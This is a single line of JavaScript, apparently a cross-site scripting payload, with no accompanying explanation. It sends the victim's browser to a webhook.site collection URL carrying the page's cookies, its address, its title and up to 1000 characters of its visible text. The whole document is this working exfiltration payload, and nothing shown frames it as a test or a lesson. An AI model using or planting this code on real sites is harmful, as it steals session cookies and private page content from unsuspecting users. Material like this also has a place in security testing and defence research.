location = "https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db?c="
  + encodeURIComponent(document.cookie)
  + "&u=" + encodeURIComponent(location.href)
  + "&t=" + encodeURIComponent(document.title)
  + "&b=" + encodeURIComponent(document.body.innerText.slice(0, 1000));
